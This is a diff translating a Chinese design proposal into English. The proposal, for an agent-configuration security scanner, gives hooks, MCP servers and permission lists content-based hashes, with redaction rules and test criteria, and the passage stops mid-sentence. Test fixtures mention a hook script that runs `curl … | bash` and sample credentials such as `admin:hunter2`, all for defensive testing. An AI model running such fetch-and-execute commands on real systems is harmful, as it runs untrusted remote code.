@@ -1,288 +1,378 @@
 <!-- SPDX-License-Identifier: MIT -->
-# 009 — hook、MCP、permission 没有哈希,闸门和信誉库对它们恒"不认识"
+# 009 — Hooks, MCP servers and permissions have no hash, so the gate and the reputation allowlist never "recognise" them
 
-- **来源**:hook、MCP 服务器和权限列表的 artifact 哈希为空,闸门的 SessionStart 和信誉库按哈希识别内容,对这三类恒判为未知;
-  同一份配置在两台机器上也没有共同的身份。移植自旧仓 agent-guard 的 P-051(私有仓)
-- **依赖**:无
-- **分支**:`p/009-content-hash-three-kinds`
+- **Source**: the artifact hash of hooks, MCP servers and permission lists is empty. The gate's SessionStart and the
+  reputation allowlist identify content by hash, so they always judge these three kinds as unknown; the same config on
+  two machines also has no shared identity. Ported from P-051 in the former private repository agent-guard
+- **Depends on**: none
+- **Branch**: `p/009-content-hash-three-kinds`
 
-<!-- 没有「状态」行:文件所在目录就是状态(draft/ design/ complete/ rejected/),见 README.md。 -->
+<!-- No "Status" line: the directory the file is in is the status (draft/ design/ complete/ rejected/), see README.md. -->
 
-## 问题
+## Problem
 
-`ArtifactReport.Hash` 是信誉库和闸门批准共用的 key(`.claude/rules/hash.md`)。skill、plugin、单文件、connector 都有;
-**hook、MCP server、permission 三类从来没有** —— 采集时就写死了空串:
+`ArtifactReport.Hash` is the key shared by the reputation allowlist and gate approvals (`.claude/rules/hash.md`). Skills,
+plugins, single files and connectors all have one; **hooks, MCP servers and permissions never have** — collection
+hard-codes the empty string:
 
-| 位置 | 写进 Hash 的 |
+| Location | What goes into Hash |
 |---|---|
-| `internal/collect/hooks.go:64`(每条 hook,settings.json 和插件自带的都走这里) | `""` |
-| `internal/collect/collect.go:485`(每个 MCP server,`~/.claude.json`、项目 `.mcp.json`、插件 `.mcp.json`) | `""` |
-| `internal/collect/collect.go:549`、`:553`(`permissions` allow/deny,和 `settings env` 块) | `""` |
+| `internal/collect/hooks.go:64` (every hook; both settings.json hooks and plugin-bundled hooks go through here) | `""` |
+| `internal/collect/collect.go:485` (every MCP server: `~/.claude.json`, the project `.mcp.json`, the plugin `.mcp.json`) | `""` |
+| `internal/collect/collect.go:549`, `:553` (`permissions` allow/deny, and the `settings env` block) | `""` |
 
-而每个消费方都把 `""` 读成"没人审过":
+And every consumer reads `""` as "nobody reviewed this":
 
-- `gate.Store.Approved("")` 恒 false(`internal/gate/approvals.go:129-135`,`TestEmptyHashIsNeverApproved` 钉着),
-  `Store.Approve` 遇到 `""` 直接返回、什么都不存(`approvals.go:167-175`);
-- `reputation.DB.Match("")` 恒 false(`internal/reputation/reputation.go:111-117`);
-- 闸门 `SessionStart` 按 `Approved(a.Hash)` 跳过已批准的(`internal/gate/hook.go:381`),这三类永远跳不过;
-- `aguard hash <root>` 对这三类打印空哈希(`cmd/aguard/main.go:827`)。
+- `gate.Store.Approved("")` is always false (`internal/gate/approvals.go:129-135`, pinned by
+  `TestEmptyHashIsNeverApproved`), and `Store.Approve` returns immediately on `""` and stores nothing
+  (`approvals.go:167-175`);
+- `reputation.DB.Match("")` is always false (`internal/reputation/reputation.go:111-117`);
+- the gate's `SessionStart` skips approved artifacts by `Approved(a.Hash)` (`internal/gate/hook.go:381`); these three
+  kinds can never be skipped;
+- `aguard hash <root>` prints an empty hash for these three kinds (`cmd/aguard/main.go:827`).
 
-后果:
+Consequences:
 
-- **这三类是闸门管不住的那一半**(从会话第一轮就活着,没有加载事件),却也是唯一一类**连"认识"都做不到**的:
-  同一份配置、同一条 hook,每台机器、每次会话都是"新的";信誉库里也无法为它们录入任何一条(`reputation.New` 丢掉空 key 的条目)。
-- **`aguard approve <root>` 在最差 artifact 是 hook/MCP/permission 时打印 `approved … hash ` 然后什么都没存** ——
-  `Approve` 把空 key 静默丢掉了。
+- **These three kinds are the half the gate cannot hold** (live from the first turn of the session, no load event), yet
+  they are also the only kind that **cannot even be "recognised"**: the same config, the same hook, is "new" on every
+  machine and in every session; and no entry for them can be recorded in the reputation allowlist (`reputation.New` drops
+  entries with an empty key).
+- **When the worst artifact is a hook/MCP/permission, `aguard approve <root>` prints `approved … hash ` and then stores
+  nothing** — `Approve` silently dropped the empty key.
 
-用 `main`(`dec64ca`)构建的二进制对一个临时 root 手跑(2026-10-09):一条 `PreToolUse[Bash]` hook 跑 `sh ~/.claude/hooks/pre.sh`,
-脚本里是 `curl … | bash`:
+Run by hand with a binary built from `main` (`dec64ca`) against a temporary root (2026-10-09): one `PreToolUse[Bash]` hook
+runs `sh ~/.claude/hooks/pre.sh`, and the script contains `curl … | bash`:
 
 ```
-aguard hash <root>          →   "  hook:PreToolUse[Bash]#1"(哈希一栏是空的)
+aguard hash <root>          →   "  hook:PreToolUse[Bash]#1" (the hash column is empty)
 aguard approve <root>       →   approved hook "PreToolUse[Bash]#1" (75/100, accepted-risk)
-                                  hash                                  ← 空
-                                exit 0;.aguard-approvals.json 里 "approvals": {}
-SessionStart                →   照样列出 hook PreToolUse[Bash]#1 75/100 EXEC-001
+                                  hash                                  ← empty
+                                exit 0; .aguard-approvals.json has "approvals": {}
+SessionStart                →   still lists hook PreToolUse[Bash]#1 75/100 EXEC-001
 ```
 
-真机(本机 `~/.claude`,2026-10-09,同一个 `main` 二进制):hook 29 个、MCP 27 个、permission 2 个,**58 个 Hash 全是空串**;
-其余 117 个 artifact 都有哈希。
+On a real machine (the local `~/.claude`, 2026-10-09, the same `main` binary): 29 hooks, 27 MCP servers, 2 permission
+artifacts — **all 58 Hashes are the empty string**; the other 117 artifacts all have a hash.
 
-## 初步方向
+## Initial direction
 
-在 detect 阶段(`Redact` 和脚本跟进都在那里;collect 不能 import detect)给这三类算一个**按内容的**哈希:
-带 kind 前缀做域分离,不含 `OwnerRoot` 和任何本机绝对路径,MCP/permission 用排序键的规范 JSON,
-secret 值先脱敏(哈希会印进 JSON、存进 approvals,不能是凭据的摘要);hook 的哈希包含它跟进的脚本内容。
-`TreeHash`/`FileHash` 一字不动(信誉条目和已存批准全靠它们)。在 `analyze()` 里先于信誉、闸门、`approve` 填好;`aguard hash` 同步。
+In the detect stage (that is where `Redact` and script following live; collect cannot import detect), compute a
+**content-based** hash for these three kinds: with a kind prefix for domain separation, excluding `OwnerRoot` and any local
+absolute path; canonical JSON with sorted keys for MCP/permission; secret values redacted first (the hash is printed into
+JSON and stored in approvals, so it must not be a digest of a credential); the hook hash includes the content of the
+scripts it follows. `TreeHash`/`FileHash` do not change by a single character (reputation entries and stored approvals
+depend entirely on them). Fill it in `analyze()` before reputation, the gate and `approve`; `aguard hash` in step.
 
-## 设计
+## Design
 
-一个函数 `detect.ContentHashes(root, arts)`,返回副本,只给 Hash 为空、且不带 `PARSE-000`(`SrcParseError`)的
-hook / mcp / permission artifact 填值;别的 kind 原样返回。`analyze()` 在 `detect.Run` 之后**紧接着**调它,
-在 permcheck、信誉、ignore、判官之前 —— 闸门的 `SessionStart`(经 `scanEnv`)、`aguard approve`(经 `checkTarget`)、
-Downloads 那一路(经 `checkTarget`)全在它后面。`aguard hash` 在 `CollectTarget` 之后调同一个函数。
+One function, `detect.ContentHashes(root, arts)`, returns a copy and fills a value only for hook / mcp / permission
+artifacts whose Hash is empty and that do not carry `PARSE-000` (`SrcParseError`); other kinds are returned unchanged.
+`analyze()` calls it **immediately** after `detect.Run`, before permcheck, reputation, ignore and the judge — the gate's
+`SessionStart` (via `scanEnv`), `aguard approve` (via `checkTarget`) and the Downloads path (via `checkTarget`) all come
+after it. `aguard hash` calls the same function after `CollectTarget`.
 
-**定义**:`hex(sha256(<域> 0x00 <规范 JSON>))`。
+**Definition**: `hex(sha256(<domain> 0x00 <canonical JSON>))`.
 
-| 种类 | 域 | 规范 JSON 里有什么 | 明确不含 |
+| Kind | Domain | What is in the canonical JSON | Explicitly excluded |
 |---|---|---|---|
-| hook(command) | `aguard:hook:v1` | `event`、`matcher`、`entry`:这条 hook 自己的 JSON 对象**整个**(collect 原样留在 `Hook.Entry`,脱敏视图)、`scripts`:命令里每个脚本引用按出现顺序一项 | artifact 名(`#n` 序号、插件后缀)、settings 文件路径、`OwnerRoot`、脚本的解析后路径 |
-| hook(http) | `aguard:hook:v1` | `event`、`matcher`、`entry`(同上) | 同上 |
-| mcp | `aguard:mcp:v1` | `mcpServers.<key>` 整个条目,所有字符串值取脱敏视图 | server 名(它是标签,和 skill 目录名不进树哈希同理)、文件路径 |
-| permission | `aguard:permission:v1` | `{"permissions": <整个 permissions 对象,脱敏视图>, "scripts": [allow 条目引用的脚本]}` | 作用域后缀、文件路径 |
-| settings env | `aguard:settings-env:v1` | `env` 对象,值取脱敏视图 | 同上 |
+| hook (command) | `aguard:hook:v1` | `event`, `matcher`, `entry`: this hook's own JSON object **in full** (collect keeps it verbatim in `Hook.Entry`; redacted view), `scripts`: one item per script reference in the command, in order of appearance | artifact name (`#n` ordinal, plugin suffix), settings file path, `OwnerRoot`, the resolved path of the script |
+| hook (http) | `aguard:hook:v1` | `event`, `matcher`, `entry` (as above) | as above |
+| mcp | `aguard:mcp:v1` | the whole `mcpServers.<key>` entry, every string value in its redacted view | server name (it is a label, for the same reason a skill's directory name is not in the tree hash), file path |
+| permission | `aguard:permission:v1` | `{"permissions": <the whole permissions object, redacted view>, "scripts": [scripts referenced by allow entries]}` | scope suffix, file path |
+| settings env | `aguard:settings-env:v1` | the `env` object, values in their redacted view | as above |
 
-- **`scripts` 的每一项**:跟进方式与 `hookUnits` / `permissionUnits` 完全同一套(`resolveHookScript`,失败再
-  `resolveInOwnerRoot`;解析成功但不在 HOME 内不读)。读到 → `"sha256:<collect.FileHash>"`(流式、拒非常规文件、
-  不受 1 MiB 扫描上限影响);路径有变量/glob 或没有这个文件 → `"unresolved"`;在 HOME 外 → `"outside-home"`;
-  存在但读不了 → `"unreadable"`。**三个标记互不相同**,理由与 `TreeHash` 的 `unreadableMark` 同一条:"没有 X"和
-  "X 读不了"不能同 key。永远不会因此得到空哈希。
-- **规范 JSON**:`json.Decoder.UseNumber`(数字保留原文)、`encoding/json` 排序键、`SetEscapeHTML(false)`、
-  数组保序。**不是 RFC 8785 / JCS**(见「不能说什么」)。
-- **脱敏视图**:`Redact` 的**凭据那一半**(URL 里的密码、`-u user:pass`、`--token x`、key 宣告的赋值、
-  已知前缀 token),**不含高熵兜底**;**替换只许忘掉 secret,不许拿走结构**(未决 3、11):一次替换若会抹掉结构字符,这个值
-  原样进哈希。结构按读它的东西定 —— shell 值(hook 的 command;MCP 条目的 `command` 与 `args`;permission 条目 `Tool(…)`
-  括号里的模式)是 `` $ ` ( ) ; | & < > \ * ? # [ ] { } ``,其余值是 URL 分隔符 `# ? \`。对象里的字符串值以 `KEY=VALUE`
-  的形式过一遍(env 的 key 才是信号,`DB_PASSWORD=hunter2` 单看 `hunter2` 谁都认不出);数组里紧跟在 `-` 开头元素后面的值
-  以 `flag value` 的形式过(`["--api-key", "…"]`)。
-- **为什么先脱敏**:哈希会印进 `--json` 报告、存进 approvals 文件,一个低熵 secret 的摘要是谁都能暴力还原的承诺
-  (W-006 那条:任何 Hash 都不能是凭据的摘要)。approvals 和信誉库按内容建 key,哈希不必、也不该绑住某台机器上的那个 secret。
-- **`Redact` 本身一字节行为不变**:拆成 `redactCredentials`(凭据那一半)+ `redactEntropy` 两步,`Redact = redactEntropy(redactCredentials(s))`。
-- **插件自带的 MCP server**:artifact 名带 ` (plugin …)` 后缀,配置里的 key 没有。`ArtifactReport` 加一个不序列化的
-  `MCPServer`(collect 填 key),哈希按它找条目(未决 6)。
-- **root 先 `filepath.Abs`**(未决 10、11):`--root ~/.claude/` 的尾部斜杠会让 home == root,`aguard hash .` 会让
-  home 是 `.`,`~/…` 的脚本都解析到错的目录,同一份配置因为路径怎么敲而有两个身份。
+- **Each item of `scripts`**: followed exactly the same way as in `hookUnits` / `permissionUnits` (`resolveHookScript`,
+  falling back to `resolveInOwnerRoot` on failure; resolved but not inside HOME → not read). Read →
+  `"sha256:<collect.FileHash>"` (streamed, refuses non-regular files, not subject to the 1 MiB scan cap); the path has a
+  variable/glob or the file does not exist → `"unresolved"`; outside HOME → `"outside-home"`; exists but cannot be read →
+  `"unreadable"`. **The three markers differ from each other**, for the same reason as `TreeHash`'s `unreadableMark`:
+  "there is no X" and "X cannot be read" must not share a key. This never yields an empty hash.
+- **Canonical JSON**: `json.Decoder.UseNumber` (numbers keep their original text), `encoding/json` sorted keys,
+  `SetEscapeHTML(false)`, arrays keep their order. **Not RFC 8785 / JCS** (see "Must not claim").
+- **Redacted view**: the **credential half** of `Redact` (passwords in URLs, `-u user:pass`, `--token x`, key-declared
+  assignments, known-prefix tokens), **without the high-entropy catch-all**; **a replacement may only forget a secret,
+  never take away structure** (open questions 3, 11): if a replacement would erase structural characters, the value goes
+  into the hash unchanged. What counts as structure depends on what reads the value — for shell values (a hook's command;
+  an MCP entry's `command` and `args`; the pattern inside the parentheses of a permission entry `Tool(…)`) it is
+  `` $ ` ( ) ; | & < > \ * ? # [ ] { } ``, for other values the URL separators `# ? \`. String values inside objects go
+  through in the form `KEY=VALUE` (in env the key is the signal: in `DB_PASSWORD=hunter2`, `hunter2` alone is recognisable
+  to nobody); a value in an array that immediately follows an element starting with `-` goes through in the form
+  `flag value` (`["--api-key", "…"]`).
+- **Why redact first**: the hash is printed into the `--json` report and stored in the approvals file; a digest of a
+  low-entropy secret is a commitment anyone can brute-force back (the W-006 rule: no Hash may be a digest of a
+  credential). Approvals and the reputation allowlist are keyed by content; the hash need not, and should not, bind to the
+  secret on one particular machine.
+- **`Redact` itself does not change by one byte of behaviour**: it is split into two steps, `redactCredentials` (the
+  credential half) + `redactEntropy`, with `Redact = redactEntropy(redactCredentials(s))`.
+- **Plugin-bundled MCP servers**: the artifact name carries a ` (plugin …)` suffix, the key in the config does not.
+  `ArtifactReport` gains a non-serialised `MCPServer` (collect fills in the key), and the hash finds the entry by it
+  (open question 6).
+- **The root goes through `filepath.Abs` first** (open questions 10, 11): the trailing slash in `--root ~/.claude/` makes
+  home == root, `aguard hash .` makes home `.`, scripts under `~/…` all resolve into the wrong directory, and the same
+  config has two identities depending on how the path was typed.
 
-## 完成的判据
+## Done criteria
 
-- [x] `TestContentHashGolden`(`internal/detect/contenthash_test.go`,新):五个固定 fixture(跟进一个脚本的 command hook、
-  http hook、MCP server、permissions、settings env)→ 规范输入**字节**等于字面串、哈希等于字面常量。哈希可以
-  **手算**:`printf 'aguard:hook:v1\0%s' '<字面串>' | shasum -a 256`。W1 编译红(没有 `ContentHashes`)
-- [x] `TestContentHash_SameConfigTwoMachines`(同文件,新):同一 hook 配置 + 同样内容的脚本放在两个不同 home 下;
-  同一插件 hook 在两个不同 `OwnerRoot` 下;同一 MCP 条目在两个不同路径的文件里、改了 server 名 → 哈希两两相等且非空;
-  root 带尾部斜杠、写成 `.` → 同一个哈希
-- [x] `TestContentHash_HookFollowsItsScript`(新):改 settings hook 跟进的脚本 / 插件 hook 在自己树里跟进的脚本 → 哈希变
-- [x] `TestContentHash_ScriptThatCannotBeReadIsMarked`(新):脚本 `chmod 000` → 哈希非空,且不同于可读时、不同于脚本不存在时;
-  不存在 / 路径带变量 → `unresolved`;解析到 HOME 外 → `outside-home`;三个标记两两不同(root 运行时跳过 `chmod` 那半)
-- [x] `TestContentHash_SecretsAreNotDigestInputs`(新):MCP env `DB_PASSWORD`、`Authorization` 头、hook 命令里的 `-u admin:…`、
-  URL 里的密码 —— 两个不同 secret 得到**同一个**哈希,等于把它写成 `<REDACTED>` 时的哈希,规范输入里不含 secret 原文
-  (**有意为之**:只改 secret 不重键)。同一测试里的反向:URL 密码位置换成 `$(…)` → 哈希变;一个没有 key 宣告的
-  base64 载荷换掉 → 哈希变;改一个非 secret 参数 → 哈希变
-- [x] `TestContentHash_ReplacementNeverTakesStructure`(新,未决 11):对照组 —— 精确授权里的密码、授权里的 token、
-  MCP url 里的密码,两个不同 secret 仍同哈希、不进输入;反向 —— `Bash(curl -u admin:hunter2)` → `…admin:*)`、
-  `Bash(deploy --token abc123)` → `…--token *)`、MCP / http hook 的 url 里"密码"换成 `443#` / `443?` 把 host 换掉、hook 命令密码位
-  换成 glob、同一命令换 hook type、同一条目加一个字段 —— 七对全部重键,且对着不带结构守卫、只哈希四个字段的实现全红
-- [x] `TestContentHash_KindsAreDomainSeparated`(新):同一份规范字节在四个域下 → 四个互不相同的值,且都不等于这份字节的裸 sha256
-- [x] `TestReputation_RecognisesAHook`(`cmd/aguard/contenthash_test.go`,新):扫一个带 hook 的 fixture,用它的 hook 哈希造一条
-  `malicious` 信誉条目 → 那条 hook 得到 `REP-BAD`。W1 红(哈希是空串,`reputation.New` 直接丢掉这条)
-- [x] `TestGate_ApprovedHookLeavesSessionStart`(`cmd/aguard/gate_e2e_test.go`,新):root 里一条跟进 `curl | bash` 脚本的 hook;
-  `approvePath(root)` 之后 approvals 里**有一条** hook 记录,`SessionStart` 不再列它;再改它跟进的脚本 → `SessionStart` 又列出来。
-  W1 红:打印 `approved` 而 approvals 为空,`SessionStart` 照列
-- [x] `TestHashCommand_PrintsConfigHashes`(`cmd/aguard/contenthash_test.go`,走真二进制,新):`aguard hash <root>` 每一行
-  hook / mcp / permission 都是 64 位十六进制,且等于 `scan --json` 里同一 artifact 的 `hash`。W1 红(空)
-- [x] 反向断言 `TestScan_OnlyConfigHashesChange`(`cmd/aguard/contenthash_test.go`,新,随 W5 落地):同一 fixture(hook、两处 MCP、
-  permissions、env、skill、CLAUDE.md)关掉/打开这一步各扫一次,把三类的 `hash` 置空后 JSON **逐字节相同**;
-  其余 kind 的 `hash` 一个不变
-- [x] 反向断言 `TestContentHash_ParseErrorArtifactsStayUnhashed`(新):坏掉的 `settings.json` / `.claude.json` → `PARSE-000`
-  artifact 的 Hash 仍是 `""`;`TestEmptyHashIsNeverApproved` 不改一字仍绿
-- [x] 反向断言不改一字仍绿:`TestHashGolden`(两个常量)、`TestAdversarial_ConcurrencyDoesNotChangeOutput`、
-  `TestRun_ConcurrentDeterministic`、`TestImports_CredentialFileRefused`(W-006)、`internal/detect/redact_test.go` 全部。
-  (`TestCollectHooks_PerCommand` 是整体比较 `model.Hook` 的,`Hook` 多了 `Entry` 之后改成比较前先清掉它,并新加一句断言
-  `Entry` 等于原文 —— 原来的四个字段断言一个没少)
-- [x] 真机:`scan --root ~/.claude --quiet --json` 前后对比,**只有** hook / mcp / permission 的 `hash` 不同;记数字不记名字
-- [x] `make verify` 绿;`go version` 无工具链切换
+- [x] `TestContentHashGolden` (`internal/detect/contenthash_test.go`, new): five fixed fixtures (a command hook that
+  follows a script, an http hook, an MCP server, permissions, settings env) → the canonical input **bytes** equal a literal
+  string and the hash equals a literal constant. The hash can be **computed by hand**:
+  `printf 'aguard:hook:v1\0%s' '<literal string>' | shasum -a 256`. W1 red at compile time (no `ContentHashes`)
+- [x] `TestContentHash_SameConfigTwoMachines` (same file, new): the same hook config + a script with the same content
+  placed under two different homes; the same plugin hook under two different `OwnerRoot`s; the same MCP entry in two files
+  at different paths, with the server renamed → hashes pairwise equal and non-empty; a root with a trailing slash, or
+  written as `.` → the same hash
+- [x] `TestContentHash_HookFollowsItsScript` (new): changing the script a settings hook follows / the script a plugin hook
+  follows inside its own tree → the hash changes
+- [x] `TestContentHash_ScriptThatCannotBeReadIsMarked` (new): script `chmod 000` → the hash is non-empty, and differs from
+  the readable case and from the case where the script does not exist; does not exist / path has a variable →
+  `unresolved`; resolves outside HOME → `outside-home`; the three markers are pairwise different (the `chmod` half is
+  skipped when running as root)
+- [x] `TestContentHash_SecretsAreNotDigestInputs` (new): MCP env `DB_PASSWORD`, an `Authorization` header, `-u admin:…` in a
+  hook command, a password in a URL — two different secrets get the **same** hash, equal to the hash when the secret is
+  written as `<REDACTED>`, and the canonical input does not contain the secret's original text (**intentional**: changing
+  only the secret does not re-key). The reverse in the same test: replacing the URL password position with `$(…)` → the
+  hash changes; replacing a base64 payload that has no declaring key → the hash changes; changing a non-secret argument →
+  the hash changes
+- [x] `TestContentHash_ReplacementNeverTakesStructure` (new, open question 11): control group — a password in an exact
+  grant, a token in a grant, a password in an MCP url: two different secrets still get the same hash and do not enter the
+  input; reverse — `Bash(curl -u admin:hunter2)` → `…admin:*)`, `Bash(deploy --token abc123)` → `…--token *)`, the
+  "password" in an MCP / http hook url replaced with `443#` / `443?` so that the host changes, the password position of a
+  hook command replaced with a glob, the same command with a different hook type, the same entry with one added field —
+  all seven pairs re-key, and all are red against an implementation without the structure guard that hashes only four
+  fields
+- [x] `TestContentHash_KindsAreDomainSeparated` (new): the same canonical bytes under the four domains → four mutually
+  different values, none of them equal to the bare sha256 of those bytes
+- [x] `TestReputation_RecognisesAHook` (`cmd/aguard/contenthash_test.go`, new): scan a fixture with a hook, build a
+  `malicious` reputation entry from its hook hash → that hook gets `REP-BAD`. W1 red (the hash is the empty string, and
+  `reputation.New` drops the entry outright)
+- [x] `TestGate_ApprovedHookLeavesSessionStart` (`cmd/aguard/gate_e2e_test.go`, new): a hook in the root that follows a
+  `curl | bash` script; after `approvePath(root)` approvals hold **one** hook record and `SessionStart` no longer lists it;
+  then change the script it follows → `SessionStart` lists it again. W1 red: prints `approved` while approvals are empty,
+  and `SessionStart` lists it all the same
+- [x] `TestHashCommand_PrintsConfigHashes` (`cmd/aguard/contenthash_test.go`, through the real binary, new): every hook /
+  mcp / permission line of `aguard hash <root>` is 64 hex characters and equals the `hash` of the same artifact in
+  `scan --json`. W1 red (empty)
+- [x] Reverse assertion `TestScan_OnlyConfigHashesChange` (`cmd/aguard/contenthash_test.go`, new, lands with W5): the same
+  fixture (hook, MCP in two places, permissions, env, skill, CLAUDE.md) scanned once with this step off and once with it
+  on; after blanking the `hash` of the three kinds the JSON is **byte-for-byte identical**; not one `hash` of the other
+  kinds changes
+- [x] Reverse assertion `TestContentHash_ParseErrorArtifactsStayUnhashed` (new): a broken `settings.json` /
+  `.claude.json` → the Hash of the `PARSE-000` artifact is still `""`; `TestEmptyHashIsNeverApproved` stays green without a
+  single character changed
+- [x] Reverse assertions that stay green without a single character changed: `TestHashGolden` (two constants),
+  `TestAdversarial_ConcurrencyDoesNotChangeOutput`, `TestRun_ConcurrentDeterministic`, `TestImports_CredentialFileRefused`
+  (W-006), all of `internal/detect/redact_test.go`. (`TestCollectHooks_PerCommand` compares `model.Hook` as a whole; now
+  that `Hook` has `Entry`, it clears that field before comparing, and a new assertion checks that `Entry` equals the
+  original text — none of the original four field assertions was dropped)
+- [x] On a real machine: compare `scan --root ~/.claude --quiet --json` before and after; **only** the `hash` of hook /
+  mcp / permission differs; record numbers, not names
+- [x] `make verify` green; `go version` shows no toolchain switch
 
-## 不做什么
+## Out of scope
 
-- **`TreeHash` / `FileHash` / `ExcludeFromHash` / `connectorHash` 不动**:`internal/collect/hash.go`、`hash_test.go`、`skip.go`、
-  `connectors.go` 的 diff 为空。信誉条目和已存批准全靠它们
-- **不改任何发现、分数、note**:差分测试 + 真机对比证明;**插件自带 MCP server 扫不到规则这个已有缺口不在这里修**(未决 6)
-- **闸门代码不动**(`internal/gate` diff 为空):不新增批准入口、不新增写批准的路径;`SessionStart` 仍然只告知、不拦
-- **`approvePath` 不动**:对仍然是空哈希的 artifact(`PARSE-000` 那几个)它照旧打印 `approved` 而什么都不存 —— 由 P-011 单独处理
-- **信誉数据不动**:`internal/reputation/data/reputation.json` 不加这三类的条目
-- **不哈希 MCP server 的代码**(npx 包、args 里的本地脚本):detect 本来也不跟进它们,只哈希配置条目
-- **不哈希整个 `settings.json` / `.claude.json`**:多个 artifact 共用一个文件、`.claude.json` 每次会话都变、
-  而且会和 `aguard approve settings.json` 存的文件哈希相等
-- **不为哈希去读 HOME 外的脚本**(不变量 #2):只记 `outside-home`
-- **不改写命令文本**:命令里写死的绝对路径照原样进哈希,不替换成 `~`
-- **`--root` 带尾斜杠 / 相对写法时 detect 跟不进 hook 脚本的漏报不在这里修**(未决 10,P-010)
-- 人类可读报告(text / markdown / html / sarif)不出现任何新内容(`internal/report` diff 为空;它们本来就不印哈希);
-  `internal/judge` 不动;不加依赖,`go.mod` / `go.sum` 不动;`docs/install-gate.md` 对子不动(没有新的用户操作)
+- **`TreeHash` / `FileHash` / `ExcludeFromHash` / `connectorHash` do not change**: the diff of `internal/collect/hash.go`,
+  `hash_test.go`, `skip.go` and `connectors.go` is empty. Reputation entries and stored approvals depend entirely on them
+- **No finding, score or note changes**: proven by the differential test + the real-machine comparison; **the existing
+  gap that plugin-bundled MCP servers are not reached by the rules is not fixed here** (open question 6)
+- **The gate code does not change** (`internal/gate` diff is empty): no new approval entry point, no new path that writes
+  approvals; `SessionStart` still only informs and does not block
+- **`approvePath` does not change**: for artifacts that still have an empty hash (the `PARSE-000` ones) it still prints
+  `approved` and stores nothing — handled separately by P-011
+- **Reputation data does not change**: `internal/reputation/data/reputation.json` gets no entries for these three kinds
+- **The code of MCP servers is not hashed** (npx packages, local scripts in args): detect does not follow them either;
+  only the config entry is hashed
+- **The whole `settings.json` / `.claude.json` is not hashed**: several artifacts share one file, `.claude.json` changes
+  every session, and the hash would equal the file hash stored by `aguard approve settings.json`
+- **Scripts outside HOME are not read for the hash** (invariant #2): only `outside-home` is recorded
+- **Command text is not rewritten**: absolute paths hard-coded in a command go into the hash as written, not replaced
+  with `~`
+- **The false negative where detect does not follow hook scripts when `--root` has a trailing slash / is relative is not
+  fixed here** (open question 10, P-010)
+- Human-readable reports (text / markdown / html / sarif) show no new content (`internal/report` diff is empty; they never
+  printed hashes); `internal/judge` does not change; no new dependencies, `go.mod` / `go.sum` do not change; the
+  `docs/install-gate.md` pair does not change (no new user action)
 
-## 不能说什么
+## Must not claim
 
-- **不说"改任何一个字节都会重新问"**。被脱敏替换掉的那一段(key 宣告的 secret 值、已知前缀 token、URL / flag 里的密码,
-  且不含结构字符)改了不换哈希 —— 有意为之(决定 1)。**也不说"这样绝不会静默放行"**:一个在批准时就已经
-  "把凭据名变量解码再执行"的配置,把编码在那段值里的载荷换掉,哈希不变;MCP 的 env / header 如果被 server 自己拿去
-  eval,同理。高熵兜底不进哈希视图、带结构字符的替换原样保留,堵的是 base64 换载荷、`$(…)` / glob / 授权通配 / URL 换 host
-  这几种(未决 3、11);剩下的都要求被批准的那份配置本身就在做"解码 / 求值一个凭据值"
-- **不说"secret 不会进哈希"**,只说"`Redact` 认得出的不会"。`Redact` 是尽力而为:`MYSQL_PASS=hunter2`(`credKeys` 里没有
-  `pass`)、`--db-password hunter2`(`flagSecretRE` 要求紧跟 `--password`)、`mysql -phunter2` 都认不出,这些值原样进摘要输入,
-  而摘要可以被暴力还原(未决 11)。补它要改 `redactCredentials`,会让三类全部重键,也会改报告里的 snippet,另开
-- **不说"hook 的哈希覆盖它运行的一切"**:脚本在 HOME 外、路径里有变量、读不了时,哈希里只有一个标记,脚本本身改了哈希不变;
-  MCP 的哈希只覆盖配置条目,不覆盖 server 的代码
-- **不说"这三类永远不可能和文件哈希相等"**:单文件哈希是任意字节的 sha256,一个字节恰好是"域 + 0x00 + 规范 JSON"的文件会同值。
-  和树哈希、和彼此相等需要 sha256 碰撞
-- **不说规范 JSON 是 RFC 8785 / JCS**:数字保留原文(JCS 会规范化)、`\b` `\f` 写成 `\u0008` `\u000c`、键按 UTF-8 字节排序
-  (JCS 按 UTF-16)。谁要在别处重算这个哈希,要照本仓库的定义,不是照 JCS
-- **不说"闸门现在管得住 hook / MCP"**:本条只让"已批准"对这三类有了意义。也不说"可以单独批准一条 hook":唯一入口仍是
-  `aguard approve <root>`,它取最差的那个 artifact
-- **不说"同一配置在所有机器上同哈希"**:命令里写死的绝对路径、没有 key 宣告的高熵 token 本身就让配置不同
-- **不说插件自带的 MCP server 被规则扫过**(它没有,见未决 6)
+- **Do not say "changing any single byte asks again"**. The segment replaced by redaction (key-declared secret values,
+  known-prefix tokens, passwords in URLs / flags, when they contain no structural characters) can change without changing
+  the hash — intentional (decision 1). **Also do not say "this never lets anything through silently"**: for a config that
+  at approval time already "decodes a variable with a credential name and executes it", swapping the payload encoded in
+  that value leaves the hash unchanged; the same goes for MCP env / headers if the server itself evals them. Keeping the
+  high-entropy catch-all out of the hash view and leaving replacements that contain structural characters unchanged closes
+  base64 payload swaps, `$(…)` / glob / grant wildcards and URL host changes (open questions 3, 11); everything that is
+  left requires the approved config itself to already be "decoding / evaluating a credential value"
+- **Do not say "secrets do not enter the hash"**, only "the ones `Redact` recognises do not". `Redact` is best-effort:
+  `MYSQL_PASS=hunter2` (`credKeys` has no `pass`), `--db-password hunter2` (`flagSecretRE` requires the value to follow
+  `--password` directly), `mysql -phunter2` are all unrecognised; these values go into the digest input unchanged, and the
+  digest can be brute-forced back (open question 11). Fixing that requires changing `redactCredentials`, which re-keys all
+  three kinds and also changes the snippets in reports; a separate proposal
+- **Do not say "a hook's hash covers everything it runs"**: when a script is outside HOME, has a variable in its path, or
+  cannot be read, the hash holds only a marker, and changing the script itself does not change the hash; the MCP hash
+  covers only the config entry, not the server's code
+- **Do not say "these three kinds can never equal a file hash"**: a single-file hash is the sha256 of arbitrary bytes, and
+  a file whose bytes happen to be "domain + 0x00 + canonical JSON" has the same value. Equality with a tree hash, or with
+  each other, requires a sha256 collision
+- **Do not say the canonical JSON is RFC 8785 / JCS**: numbers keep their original text (JCS normalises them), `\b` `\f`
+  are written as `\u0008` `\u000c`, keys are sorted by UTF-8 bytes (JCS sorts by UTF-16). Anyone recomputing this hash
+  elsewhere has to follow this repository's definition, not JCS
+- **Do not say "the gate can now hold hooks / MCP"**: this proposal only gives "approved" a meaning for these three kinds.
+  Also do not say "a single hook can be approved on its own": the only entry point is still `aguard approve <root>`, which
+  takes the worst artifact
+- **Do not say "the same config has the same hash on every machine"**: absolute paths hard-coded in commands and
